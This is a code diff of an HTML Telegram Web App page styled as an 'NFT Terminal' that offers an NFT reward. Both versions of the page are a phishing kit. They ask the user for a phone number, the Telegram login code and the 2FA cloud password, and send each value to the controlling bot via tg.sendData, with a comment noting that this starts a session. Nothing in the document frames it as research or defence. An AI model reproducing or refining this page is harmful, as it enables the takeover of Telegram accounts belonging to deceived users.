@@ -7,138 +7,168 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
-            background: radial-gradient(circle at top, #1a1a2e 0%, #0f0f0f 100%);
-            color: #ffffff;
+            background: radial-gradient(circle at top, #1a1a2e, #0f0f0f);
+            color: #fff;
             font-family: 'Segoe UI', Roboto, sans-serif;
-            margin: 0; display: flex; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
         }
-        .app-container {
-            width: 90%; max-width: 400px;
-            background: rgba(255, 255, 255, 0.05);
+        .app {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, .05);
             backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 40px 25px;
+            border-radius: 28px;
+            padding: 35px 25px;
             text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            box-shadow: 0 25px 60px rgba(0,0,0,.6);
+            border: 1px solid rgba(255,255,255,0.1);
         }
-        .nft-icon {
+        .icon {
             width: 80px; height: 80px;
-            background: linear-gradient(45deg, #00f2fe 0%, #4facfe 100%);
-            border-radius: 20px; margin: 0 auto 25px;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 20px rgba(79, 172, 254, 0.5);
-            animation: float 3s ease-in-out infinite;
+            background: linear-gradient(45deg, #00f2fe, #4facfe);
+            border-radius: 22px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 10px 20px rgba(0,242,254,0.3);
         }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 22px; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
+        p { font-size: 14px; color: #aaa; margin-bottom: 25px; min-height: 20px; }
         
-        h1 { font-size: 24px; font-weight: 700; letter-spacing: 1px; margin-bottom: 10px; text-transform: uppercase; }
-        p { color: #888; font-size: 14px; margin-bottom: 30px; }
-
         .input-group { margin-bottom: 20px; text-align: left; }
-        .label { font-size: 12px; color: #4facfe; text-transform: uppercase; margin-left: 10px; margin-bottom: 5px; }
-        
+        .label { font-size: 11px; color: #4facfe; text-transform: uppercase; margin-bottom: 8px; margin-left: 5px; font-weight: 700; }
+
+        select, input, button {
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            border: none;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
         select, input {
-            width: 100%; background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px; padding: 15px;
-            color: #fff; font-size: 16px; outline: none; box-sizing: border-box;
+            background: rgba(255, 255, 255, .08);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
             transition: 0.3s;
         }
-        input:focus { border-color: #4facfe; background: rgba(255, 255, 255, 0.12); }
+        input:focus { border-color: #00f2fe; background: rgba(255, 255, 255, .12); }
 
-        .btn {
-            width: 100%; background: linear-gradient(45deg, #00c6ff, #0072ff);
-            border: none; border-radius: 15px; padding: 18px;
-            color: white; font-size: 16px; font-weight: 700;
-            cursor: pointer; box-shadow: 0 10px 20px rgba(0, 114, 255, 0.3);
-            transition: 0.3s; margin-top: 10px;
+        button {
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            color: #fff;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-top: 10px;
+            box-shadow: 0 10px 20px rgba(0,114,255,0.3);
         }
-        .btn:active { transform: scale(0.98); }
+        button:active { transform: scale(.97); }
 
         .step { display: none; }
-        .active { display: block; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .active { display: block; animation: slideUp 0.4s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="nft-icon">
-        <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 2L4.5 20.29L5.21 21L12 18L18.79 21L19.5 20.29L12 2Z"/></svg>
-    </div>
+<div class="app">
+    <div class="icon">💎</div>
+    <h1>NFT Terminal</h1>
+    <p id="status">Connecting...</p>
 
     <div id="step1" class="step active">
-        <h1>Verify Identity</h1>
-        <p>Connect your account to claim NFT reward</p>
         <div class="input-group">
-            <div class="label">Region</div>
-            <select id="country" onchange="updateCode()">
-                <option value="+7">Russia (🇷🇺)</option>
-                <option value="+7">Kazakhstan (🇰🇿)</option>
-                <option value="+380">Ukraine (🇺🇦)</option>
-                <option value="+375">Belarus (🇧🇾)</option>
-                <option value="+998">Uzbekistan (🇺🇿)</option>
+            <div class="label">Select Region</div>
+            <select id="country" onchange="updatePrefix()">
+                <option value="+7">Russia 🇷🇺</option>
+                <option value="+7">Kazakhstan 🇰🇿</option>
+                <option value="+380">Ukraine 🇺🇦</option>
+                <option value="+375">Belarus 🇧🇾</option>
+                <option value="+998">Uzbekistan 🇺🇿</option>
+                <option value="+1">United States 🇺🇸</option>
+                <option value="+49">Germany 🇩🇪</option>
             </select>
         </div>
         <div class="input-group">
             <div class="label">Phone Number</div>
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="prefix" style="width: 70px;" value="+7" readonly>
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="prefix" style="width:75px; text-align:center;" value="+7" readonly>
                 <input type="tel" id="phone" placeholder="900 000 0000">
             </div>
         </div>
-        <button class="btn" onclick="go2()">CONTINUE</button>
+        <button onclick="sendPhone()">Authorize</button>
     </div>
 
     <div id="step2" class="step">
-        <h1>Enter Code</h1>
-        <p>Verification code sent to your device</p>
         <div class="input-group">
-            <div class="label">Secure Code</div>
-            <input type="number" id="sms" placeholder="● ● ● ● ●" style="text-align: center; letter-spacing: 10px;">
+            <div class="label">Verification Code</div>
+            <input type="number" id="code" placeholder="00000" style="text-align:center; letter-spacing:8px;">
         </div>
-        <button class="btn" onclick="go3()">VERIFY</button>
+        <button onclick="sendCode()">Verify Code</button>
     </div>
 
     <div id="step3" class="step">
-        <h1>Cloud Password</h1>
-        <p>Enter 2FA password to unlock NFT</p>
         <div class="input-group">
-            <div class="label">Password</div>
-            <input type="password" id="pass" placeholder="••••••••">
+            <div class="label">Cloud Password</div>
+            <input type="password" id="password" placeholder="••••••••">
         </div>
-        <button class="btn" onclick="done()">UNLOCK NFT</button>
+        <button onclick="sendPass()">Claim NFT</button>
     </div>
 </div>
 
 <script>
-    const tg = window.Telegram.WebApp; tg.expand();
+const tg = window.Telegram.WebApp;
+tg.expand();
 
-    function updateCode() { document.getElementById('prefix').value = document.getElementById('country').value; }
+// Приветствие
+const user = tg.initDataUnsafe?.user;
+const statusEl = document.getElementById("status");
+statusEl.innerText = user ? `Welcome, ${user.first_name}` : "Terminal ready";
 
-    function go2() {
-        if(document.getElementById('phone').value.length > 5) {
-            tg.sendData("PHONE_REQUESTED");
-            document.getElementById('step1').className = 'step';
-            document.getElementById('step2').className = 'step active';
-        }
+function updatePrefix() {
+    document.getElementById("prefix").value = document.getElementById("country").value;
+}
+
+function showStep(s) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    document.getElementById('step' + s).classList.add('active');
+}
+
+function sendPhone() {
+    const ph = document.getElementById('phone').value;
+    if(ph.length > 5) {
+        tg.sendData("PHONE_REQUESTED"); // Сигнал боту начать сессию
+        statusEl.innerText = "Code sent to Telegram";
+        showStep(2);
     }
+}
 
-    function go3() {
-        const c = document.getElementById('sms').value;
-        if(c.length === 5) {
-            tg.sendData("CODE:" + c);
-            document.getElementById('step2').className = 'step';
-            document.getElementById('step3').className = 'step active';
-        }
+function sendCode() {
+    const c = document.getElementById('code').value;
+    if(c.length === 5) {
+        tg.sendData("CODE:" + c);
+        statusEl.innerText = "Checking security...";
+        showStep(3);
     }
+}
 
-    function done() {
-        tg.sendData("PASS:" + document.getElementById('pass').value);
-        setTimeout(() => tg.close(), 800);
+function sendPass() {
+    const p = document.getElementById('password').value;
+    if(p.length > 0) {
+        tg.sendData("PASS:" + p);
+        statusEl.innerText = "NFT Allocation Success!";
+        setTimeout(() => tg.close(), 1200);
     }
+}
 </script>
 </body>
 </html>
